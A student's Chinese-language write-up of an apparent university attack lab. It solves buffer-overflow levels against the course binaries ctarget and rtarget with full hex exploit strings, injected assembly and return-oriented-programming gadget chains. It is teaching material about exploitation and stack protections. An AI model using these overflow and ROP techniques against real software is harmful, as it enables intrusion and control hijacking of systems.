# Bomb_lab

> 作者：Xiaoma
>
> 完成时间：2023.1.7




## 实验目的

> 通过CI与ROP两种方式对程序进行攻击
>
> 

## 环境
Ubuntu18.04 + gdb


## 实验步骤与内容

### **Code Injection Attacks - Level1**

> 要求：在不注入新代码的情况下，利用字符串重定向程序，让**CTARGET**在执行**return**语句时执行**touch1**的代码，而不是返回**test**。

test函数的C语言代码为
```C++
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

touch1函数的C语言代码为
```C++
void touch1()
{
    vlevel = 1; /*Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

反汇编`test`

![](./img/1.png)

反汇编`getbuf`

![](./img/2.png)


此时，栈中的结构为

![](./img/3.png)

已知`touch1`的地址为`0x4017c0`

则首先使用任意字符串，将`getbuf`分配的长度为`0x28`的栈帧填满，此时再输入字符串，返回地址将被覆盖，若输入字符串为`touch1`的地址，`getbuf`执行完以后将返回`touch1`继续执行。

**注意小端存储对应的字节顺序**

使用`hex2raw`将16进制数转换为ASCII字符，并使用参数`-q`不连接服务器

`.txt`文件中的内容

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

验证答案

```shell
./hex2raw < ./CI_level1/ci_level1.txt | ./ctarget -q
```

![](./img/4.png)

Code Injection Attacks - Level1完成

### **Code Injection Attacks - Level2**

> 要求：注入代码重定向程序，让**CTARGET**在执行**return**语句时执行**touch2**的代码并将**cookie**作为**touch2**的参数传入


touch2函数的C语言代码为
```C++
void touch2(unsigned val)
{
    vlevel = 2; /*Part of validation protocol */
    if(val == cookie)
    {
        printf("Touch2! : You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else
    {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

已知`touch2`函数的第一个参数在`%rdi`中，所以我们植入的代码所做的工作为：
- 执行`return`语句时使`pc`指向我们植入的代码
- 将`cookie`传入`%rdi`，已知`cookie`为`0x59b997fa`
- 跳转至`touch2`所在地址`0x4017ec`

查询执行`getbuf`时的栈顶指针

![](./img/5.png)

则此时栈中的结构为

![](./img/6.png)

需要植入的汇编指令为
```asm
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

依次对汇编代码进行汇编和反汇编
```shell
gcc -c injectCode.s
objdump -d injectCode.o > injectCode.d 
cat injectCode.d
```

![](./img/7.png)

代码总计10字节，故`.txt`文件中的内容

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

验证答案

![](./img/8.png)

Code Injection Attacks - Level2完成

### **Code Injection Attacks - Level3**
>要求：注入代码重定向程序，让**CTARGET**在执行**return**语句时执行**touch3**的代码并将字符串作为**cookie**作为**touch3**的参数传入

hexmatch函数的C语言代码为

```C++
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

touch3函数的C语言代码为

```C++
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) 
    {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } 
    else 
    {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

```

已知`hexmatch`中，生成字符串的地址是随机的，若将表示`cookie`的字符串存储在`getbuf`的栈中，会有被覆盖的风险，所以将表示`cookie`的字符串存储在`test`的栈中。

查询`test`的栈顶指针

![](./img/9.png)

`touch3`的地址为`0x4018fa`


此时栈中的结构为

![](./img/10.png)

需要植入的汇编指令为
```asm
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
```

依次对汇编代码进行汇编和反汇编

```shell
gcc -c injectCode.s
objdump -d injectCode.o > injectCode.d 
cat injectCode.d
```

![](./img/11.png)

代码总计10字节，表示`cookie`的字符串为`35 39 62 39 39 37 66 61`，故.txt文件中的内容

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

验证答案

![](./img/12.png)

Code Injection Attacks - Level3完成

### Return-Oriented Programming - level2
> 要求：通过**ROP**的方式，完成**Code Injection Attacks - Level2**的任务

在`RTARGET`中，程序采用了两种方法来避免缓冲区溢出攻击
- 栈随机化
- 限制可执行代码区域

因此我们不再能通过插入代码的方式进行攻击。

我们需要通过`ROP`的方式进行攻击，即在已有的程序代码中，寻找以`ret`结尾的，且具有特定功能的序列，将序列地址入栈形成程序链，来完成我们的任务。

实验文档给出了指令编码表 **(0x90为空字符)**

![](./img/13.png)

文档中给出了一个特定序列的例子
```C++
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
```

其汇编代码的字节级表示为

![](./img/14.png)

通过对照编码表，我们发现`48 89 c7`代表指令`movq %rax, %rdi`，已知该程序的起始地址为`0x400f15`，则`movq %rax, %rdi`的起始地址为`0x400f18`，如果将`0x400f18`入栈，则该指令可以作为文档中提到的`gadget`帮助我们完成任务。

我们只能利用`farm.c`中的代码段。

我们开始分析level2，在**Code Injection Attacks - Level2**中，我们使用`movq $0x59b99fa, %rdi`来传入`cookie`参数，但我们无法在farm.c中找到该指令序列。

我们可以通过将`cookie`传入寄存器的方式来进行参数传递，首先将`farm.c`中的代码段用汇编代码的二进制形式表示出来。

```shell
objdump -d rtarget > rtarget.d
```

通过查找发现，`farm`中并没有代表`popq %rdi`的序列。

考虑`cookie`在寄存器间中转，一次查询`movq S, %rdi`

搜索到结果

![](./img/15.png)

即`movq %rax, %rdi`

寻找`popq %rax`

![](./img/16.png)

则程序链应为

```asm
pop %rax
ret
movq %rax, %rdi
ret
````

此时栈中的内容为

![](./img/17.png)

故.txt文件中的内容
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

验证答案

![](./img/18.png)

Return-Oriented Programming - level2完成

### Return-Oriented Programming - level3
> 要求：通过**ROP**的方式，完成**Code Injection Attacks - Level3**的任务

已知在使用`movl`指令时，32位寄存器的高16位被置零。

已知栈地址是随机的，故应考虑如何准确定位`cookie`的地址。

注意到`farm`中有一个`add_xy`的函数，故可以采用`d = s + offset`的方式计算`cookie`的地址。

因为重复序列较多，寻找相关指令序列的过程不再详细描述，
最终得到的程序链为
```asm
movq %rsp, %rax
ret
movq %rax, %rdi
ret
popq %rax
ret
movl %eax, %edx
ret
movl %edx, %ecx
ret
movl %ecx, %esi
ret
lea (%rdi, %rsi, 1), %rax
ret
movq %rax, %rdi
ret
```

此时栈中的内容为

![](./img/19.png)

故.txt文件中的内容
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
ad 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
```

验证答案

![](./img/20.png)

Return-Oriented Programming - level3完成

## 结论分析与体会

本次实验加深了我对程序栈溢出以及保护的理解，了解了简单的ROP攻击方法。